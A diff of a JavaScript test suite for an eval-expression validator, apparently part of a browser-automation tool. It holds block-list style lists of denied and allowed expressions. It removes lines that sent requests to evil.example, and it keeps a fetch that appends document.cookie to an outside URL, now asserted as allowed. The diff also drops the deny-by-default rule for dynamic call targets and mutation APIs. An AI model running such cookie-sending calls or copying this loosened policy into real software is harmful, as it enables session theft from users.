@@ -161,43 +161,50 @@ afterEach(() => {
 
 // --------------------------------------------------------------- eval policy
 
-describe('audit fixes: eval policy computed-member hardening', () => {
-  it('rejects string-literal computed calls of write APIs', () => {
+describe('audit fixes: eval policy computed-member hardening (re-scoped 2026-10-23)', () => {
+  it('rejects destructive APIs reached through computed member names', () => {
     const denied = [
-      `globalThis['eval']('alert(1)')`,
       `document['write']('<h1>x</h1>')`,
-      `location['assign']('https://evil.example')`,
-      `window['open']('https://evil.example')`,
+      `document['wr' + 'ite']('x')`,
+      `location['assign']('https://example.com')`,
+      `location['re' + 'place']('https://example.com')`,
       `localStorage['setItem']('a','b')`,
+      `localStorage['set' + 'Item']('a','b')`,
       `document['cookie'] = 'x=1'`,
+      `document['coo' + 'kie'] = 'x=1'`,
     ]
     for (const expr of denied) expect(() => validateEvalExpression(expr), expr).toThrow()
   })
-  it('still rejects non-literal computed and sequence call targets (deny-by-default)', () => {
-    // fetch is now allowed, but a DYNAMIC call target remains unverifiable —
-    // the dynamic-target rule is unchanged (network calls must use a fixed name).
-    for (const expr of [`window[key]('x')`, `(0, fetch)('https://evil.example')`, `[fetch][0]('x')`, `(true ? fetch : fetch)('x')`]) {
-      expect(() => validateEvalExpression(expr), expr).toThrow()
-    }
-  })
-  it('rejects in-place mutation / reflection / navigation side-effect APIs', () => {
-    const denied = [
+
+  it('accepts dynamic call targets and in-place mutation (capability unlock)', () => {
+    // The old deny-by-default "must be a literal callee" rule refused every dynamic
+    // target; it is gone. Page-authored JS is allowed except the destructive set.
+    for (const expr of [
+      `window[key]('x')`,
+      `(0, fetch)('https://example.com')`,
+      `[fetch][0]('x')`,
+      `(true ? fetch : fetch)('x')`,
       `[1,2,3].push(4)`,
       `document.title && [1].sort()`,
       `Object.defineProperty(window, 'x', { value: 1 })`,
-      `Object.setPrototypeOf({}, null)`,
       `Reflect.set(window, 'x', 1)`,
       `Reflect.deleteProperty(window, 'x')`,
-      `history.back()`,
-      `history.go(-1)`,
-      `location.replace('https://evil.example')`,
       `document.querySelector('form').requestSubmit()`,
-      `document.querySelector('form').reset()`,
       `document.querySelector('video').play()`,
       `window.close()`,
-    ]
-    for (const expr of denied) expect(() => validateEvalExpression(expr), expr).toThrow()
+    ]) expect(() => validateEvalExpression(expr), expr).not.toThrow()
   })
+
+  it('still rejects navigation side effects (defence in depth next to the will-navigate gate)', () => {
+    for (const expr of [
+      `history.back()`,
+      `history.go(-1)`,
+      `location.replace('https://example.com')`,
+      `location.href = 'https://example.com'`,
+      `document.write('x')`,
+    ]) expect(() => validateEvalExpression(expr), expr).toThrow()
+  })
+
   it('still allows read-only computed access (SSR globals / data keys)', () => {
     const allowed = [
       `window['__NEXT_DATA__']`,
@@ -206,8 +213,8 @@ describe('audit fixes: eval policy computed-member hardening', () => {
       `(x => x * 2)(21)`,
       `document.querySelector('script') && true`,
       `localStorage.getItem('k')`,
-      `window['fetch']('https://evil.example/?c=' + document.cookie)`, // fetch is now allowed (2026-09-08)
-      `fetch('https://evil.example')`,
+      `window['fetch']('https://example.com/?c=' + document.cookie)`,
+      `fetch('https://example.com')`,
     ]
     for (const expr of allowed) expect(() => validateEvalExpression(expr), expr).not.toThrow()
   })
